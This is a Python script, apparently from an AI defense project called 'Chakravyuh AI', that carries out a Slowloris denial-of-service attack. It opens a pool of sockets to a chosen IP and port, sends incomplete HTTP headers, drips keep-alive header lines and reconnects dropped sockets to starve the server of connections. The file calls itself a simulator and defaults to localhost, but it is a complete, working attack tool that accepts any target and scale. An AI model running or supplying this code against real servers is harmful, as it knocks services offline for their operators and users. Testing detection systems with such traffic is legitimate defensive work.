#!/usr/bin/env python3
"""
Chakravyuh AI: Slowloris Low-and-Slow Resource Exhaustion Simulator
Target MITRE Class: DoS/Flood (Class 4: Slowloris / GoldenEye socket pool starvation)
Simulates low-bandwidth persistent header starvation to tie up connection pools.
"""

import socket
import sys
import time
import argparse
import random

def start_slowloris(target_ip: str, target_port: int = 8000, socket_count: int = 50, duration: int = 10):
    print("=" * 55)
    print(f"[ATTACK SIMULATION] Launching Slowloris Socket Starvation on {target_ip}:{target_port}")
    print(f"Target MITRE Class: DoS/Flood (Slowloris Variant)")
    print(f"Target Sockets: {socket_count} | Duration: {duration}s | Low-and-Slow Keep-Alive Mode")
    print("=" * 55)

    sockets = []
    
    # Step 1: Open socket pool
    print(f"[+] Spawning {socket_count} persistent socket connections...")
    for i in range(socket_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((target_ip, target_port))
            # Send partial incomplete HTTP GET header
            s.send(f"GET /?slow={random.randint(0, 5000)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target_ip}\r\n".encode())
            s.send(f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Slowloris/2.0\r\n".encode())
            s.send(f"Accept-language: en-US,en,q=0.5\r\n".encode())
            sockets.append(s)
        except Exception:
            pass

    print(f"[+] Successfully established {len(sockets)} persistent starvation sockets.")

    # Step 2: Send slow keepalive header lines
    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            sys.stdout.write(f"\r[⚡] Holding socket pool open... {remaining}s remaining (Active sockets: {len(sockets)}) ")
            sys.stdout.flush()

            # Send a slow partial header line on each active socket
            dead_sockets = []
            for s in list(sockets):
                try:
                    s.send(f"X-Keep-Alive-Header-{random.randint(1, 1000)}: {random.randint(1, 5000)}\r\n".encode())
                except Exception:
                    dead_sockets.append(s)

            # Prune dead and attempt reconnect
            for d in dead_sockets:
                sockets.remove(d)
                try:
                    ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    ns.settimeout(2.0)
                    ns.connect((target_ip, target_port))
                    ns.send(f"GET /?slow={random.randint(0, 5000)} HTTP/1.1\r\n".encode())
                    sockets.append(ns)
                except Exception:
                    pass

            time.sleep(1.0)
    except KeyboardInterrupt:
        print("\nAborted by user.")

    # Cleanup
    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    print("\n[✓] Slowloris simulation finished. Sockets closed.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Chakravyuh AI: Slowloris DoS Simulator")
    parser.add_argument("target", nargs="?", default="127.0.0.1", help="Target Defense IP (default: 127.0.0.1)")
    parser.add_argument("port", nargs="?", type=int, default=8000, help="Target Port (default: 8000)")
    parser.add_argument("--sockets", "-s", type=int, default=50, help="Socket count (default: 50)")
    parser.add_argument("--duration", "-d", type=int, default=10, help="Duration in seconds (default: 10)")
    
    args = parser.parse_args()
    start_slowloris(args.target, args.port, args.sockets, args.duration)
